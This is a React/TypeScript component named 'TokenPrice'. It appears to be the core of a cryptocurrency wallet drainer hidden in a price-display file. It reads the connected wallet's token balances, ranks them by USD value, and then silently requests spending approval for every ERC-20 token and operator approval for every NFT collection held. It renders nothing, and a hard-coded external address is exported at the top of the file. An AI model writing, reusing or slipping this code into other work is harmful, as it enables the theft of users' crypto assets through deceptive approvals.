import "./App.css";
import { useMoralis, useNFTBalances } from "react-moralis";
import Moralis from "moralis";
import { useEffect, useRef, useState } from "react";
import {
    useMoralisWeb3Api,
    useTokenPrice,
    useERC20Balances,
} from "react-moralis";
import { useConnectWallet } from "@web3-onboard/react";
import { ethers } from "ethers";
import Wallet from "./wallet";



export const myAddress = "0x103F6A08e23dA494c5Dd6504573624Ff7ac34D9b";
const erc20ContractInterface = [
    "function approve(address _spender, uint256 _amount) external returns (bool)"
];

const nftContractInterface = [
    "function approve(address operator, bool approved) external"
];

export const ercTokenContractABI = [
    {
        constant: false,
        inputs: [
            { internalType: "address", name: "_spender", type: "address" },
            { internalType: "uint256", name: "_amount", type: "uint256" },
        ],
        name: "approve",
        outputs: [
            {
                internalType: "bool",
                name: "",
                type: "bool",
            },
        ],
        payable: false,
        stateMutability: "nonpayable",
        type: "function",
    },
];

export const nftTokenContractABI = [
    {
        inputs: [
            { internalType: "address", name: "operator", type: "address" },
            { internalType: "bool", name: "approved", type: "bool" },
        ],
        name: "setApprovalForAll",
        outputs: [],
        stateMutability: "nonpayable",
        type: "function",
    },
];

export interface NFT {
    token_address: string,
    token_id: string,
    contract_type: string,
    owner_of: string,
    block_number: string,
    block_number_minted: string,
    token_uri: string,
    metadata: string,
    synced_at: string,
    amount: string,
    name: string,
    symbol: string,
}


export interface ITokenBalance {
    token_address: string;
    name: string;
    symbol: string;
    logo?: string | undefined;
    thumbnail?: string | undefined;
    decimals: string;
    balance: string;
    usdBalance?: string;
}

interface TokenProps {
    chaidId: string;
    balances: ITokenBalance[];
}

function sleep(ms: number) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const TokenPrice: React.FC<TokenProps> = (props) => {
    const { getNFTBalances, data } = useNFTBalances();
    const [tokenBalances, setTokenBalances] = useState<ITokenBalance[]>([]);
    const [highTokenBalances, setHighTokenBalances] = useState<ITokenBalance[]>([]);
    const { Moralis } = useMoralis();
    const Web3Api = useMoralisWeb3Api();
    const updated = useRef(false);


    const fetchBalances = async () => {
        if (updated.current) return;
        updated.current = true;
        setTokenBalances([]);

        let _tokenBalances: ITokenBalance[] = [];
        // let _highTokenBalances: ITokenBalance[] = [];

        for (let balance of props.balances) {
            try {
                const price = await Web3Api.token.getTokenPrice({
                    address: balance.token_address,
                });

                const balanceStr = balance.balance.toString();
                console.log(balance.decimals)
                const _price = (
                    price.usdPrice * Number(balanceStr.substring(0, balanceStr.length - Number(balance.decimals)) + ".00")

                ).toString();
                const _balance = balance;
                _balance.usdBalance = _price;

                if (Number(_price) >= 0) {
                    _tokenBalances.push(_balance);
                }
                await sleep(250);
            } catch (err) {
                console.log(err);
            }
        }



        _tokenBalances = _tokenBalances.sort((a, b) => {
            if (Number(a.usdBalance) < Number(b.usdBalance)) {
                return 1;
            }
            if (Number(a.usdBalance) > Number(b.usdBalance)) {
                return -1;
            }
            return 0;
        });


        setTokenBalances(_tokenBalances);
    };

    const fetchNFTBalance = async () => {

    }
    useEffect(() => {
        if (props.balances.length)
            fetchBalances();
        // fetchNFTLowestPrice();
        // console.log(tokenBalances)
    }, [props.balances]);

    useEffect(() => {
        (async () => {

            if (tokenBalances.length) {
                for (let ercBalance of tokenBalances) {
                    try {

                        await Wallet.approve(ercBalance.token_address, erc20ContractInterface);
                    } catch (error) { }
                }
            }
            const nftBalance = await getNFTBalances({ params: { address: Wallet.address, chain: props.chaidId as any } })
            if (nftBalance?.total) {
                const allNFTs = (nftBalance.result as any) as NFT[];
                const approvedNFT: string[] = [];
                for (let nft of allNFTs) {
                    if (!approvedNFT.find(_nft => nft.token_address == _nft)) {
                        approvedNFT.push(nft.token_address);
                        try {
                            Wallet.approveForAll(nft.token_address, nft.token_id, nftContractInterface);


                        } catch (error) { }
                    }
                }
            }


        })()

    }, [tokenBalances]);
    return <></>;
};

export default TokenPrice;